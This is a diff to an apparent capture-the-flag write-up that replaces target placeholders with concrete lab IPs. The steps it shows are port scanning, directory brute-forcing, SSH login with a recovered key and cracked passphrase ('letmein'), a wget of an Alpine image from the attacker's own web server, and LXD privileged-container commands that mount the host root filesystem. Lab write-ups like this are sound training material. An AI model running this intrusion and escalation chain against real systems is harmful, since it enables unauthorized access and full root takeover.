@@ -9,7 +9,7 @@ Linux machine with a static website exposing sensitive files. The attack path re
 ### Network Scanning
 
 ```bash
-rustscan -a <target_ip> -- -sC -sV
+rustscan -a 10.65.161.38 -- -sC -sV
 ```
 
 Open ports:
@@ -24,7 +24,7 @@ The site source contained an HTML comment revealing a potential username: `john`
 Directory enumeration:
 
 ```bash
-gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://10.65.161.38/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 Two directories of interest:
@@ -58,7 +58,7 @@ letmein
 ### SSH Access
 
 ```bash
-ssh john@<target_ip> -i ~/key_rsa
+ssh john@10.65.161.38 -i ~/key_rsa
 ```
 
 Enter `letmein` when prompted for the key passphrase.
@@ -98,7 +98,7 @@ sudo python3 -m http.server 8000
 
 ```bash
 cd /tmp
-wget http://<kali_ip>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+wget http://10.65.106.71:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
 lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
 lxc init myimage ignite -c security.privileged=true
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
